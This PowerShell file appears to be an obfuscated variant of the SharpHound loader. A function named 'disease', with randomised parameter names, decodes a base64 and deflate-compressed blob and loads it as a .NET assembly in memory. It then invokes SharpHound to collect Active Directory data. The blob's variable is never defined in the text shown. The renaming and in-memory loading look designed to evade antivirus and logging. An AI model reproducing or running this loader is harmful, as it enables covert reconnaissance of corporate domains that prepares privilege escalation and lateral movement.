function disease
{
    [CmdletBinding(PositionalBinding = $false)]
    param(
        [Alias("c")]
        [String[]]
        $pZjtEyhu99 = [String[]]@('Default'),
        [Alias("d")]
        [String]
        $ievNlAwl99,
        
        [Alias("s")]
        [Switch]
        $bRjUZDUp99,
        [Switch]
        $pPSWNqqb99,
        [String]
        $wbLafRJZ99,
        [String]
        $TEfHAEJU99,
        [String]
        $HIBuCtiN99,
        [ValidateScript({ Test-Path -Path $_ })]
        [String]
        $ZVufRtgS99 = $( Get-Location ),
        [ValidateNotNullOrEmpty()]
        [String]
        $VGADjewO99,
        [String]
        $liwmzYsn99,
        [Switch]
        $frLyCzqH99,
        [Switch]
        $QzHLQlNw99,
        [Switch]
        $QWMkQZiK99,
        [String]
        $yJDHeFqQ99,
        
        [Switch]
        $NoZip,
        
        [String]
        $afLwfMkK99,
        
        [Switch]
        $dXHYNZHA99,
        
        [Switch]
        $tMOJjBNV99,
        [String]
        $OYhgRNcK99,
        [String]
        $lOmyHlJC99,
        [string]
        $OSguOXAA99,
        [ValidateRange(0, 65535)]
        [Int]
        $MOlvJVBk99,
        [Switch]
        $iUlPvcnj99,
        
        [Switch]
        $udlCpSUk99,
        [Switch]
        $oOePNgxo99,
        [Switch]
        $TgylEIgm99,
        [ValidateRange(50, 5000)]
        [Int]
        $CqROdJnO99 = 500,
        [Switch]
        $DSozegNg99,
        [Switch]
        $BDivYuMn99,
        [Int]
        $iepADHmj99,
        [ValidateRange(0, 100)]
        [Int]
        $vQJOXlal99,
        [Int]
        $HaCQsMth99,
        [Switch]
        $mPovcPYw99,
        [String]
        $bsDFiawr99,
        [String]
        $hpMLABZI99,
        [Switch]
        $eifPgdvm99,
        [Switch]
        $Loop,
        [String]
        $XpCrGOXg99,
        [String]
        $AxEPlwaZ99,
        [ValidateRange(500, 60000)]
        [Int]
        $rTwFzdWZ99,
        
        [Alias("v")]
        [ValidateRange(0, 5)]
        [Int]
        $PnorTWpT99,
        [Alias("h")]
        [Switch]
        $Help,
        [Switch]
        $fRPUAKTg99
    )
    $vars = New-Object System.Collections.Generic.List[System.Object]
    
    if(!($PSBoundParameters.ContainsKey("help") -or $PSBoundParameters.ContainsKey("version"))){
        $PSBoundParameters.Keys | % {
            if ($_ -notmatch "verbosity"){
                $vars.add("--$_")
                if($PSBoundParameters.item($_).gettype().name -notmatch "switch"){
                    $vars.add($PSBoundParameters.item($_))
                }
            }
            elseif ($_ -match "verbosity") {
                $vars.add("-v")
                $vars.add($PSBoundParameters.item($_))
            }
        }
    }
    else {
        $PSBoundParameters.Keys |? {$_ -match "help" -or $_ -match "version"}| % {
            $vars.add("--$_")
        }
    }
    
    $tcCxuDWs99 = [string[]]$vars.ToArray()
	$zTCeELnu99 = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($qHlDEOTs99),[IO.Compression.CompressionMode]::Decompress)
	$FBgdSCCC99 = New-Object Byte[](1046528)
	$zTCeELnu99.Read($FBgdSCCC99, 0, 1046528) | Out-Null
	$UlklkgaQ99 = [Reflection.Assembly]::Load($FBgdSCCC99)
	$xpoRlsWS99 = [Reflection.BindingFlags] "Public,Static"
	$a = @()
	$UlklkgaQ99.GetType("Costura.AssemblyLoader", $false).GetMethod("Attach", $xpoRlsWS99).Invoke($Null, @())
	$UlklkgaQ99.GetType("Sharphound.Program").GetMethod("InvokeSharpHound").Invoke($Null, @(,$tcCxuDWs99))
}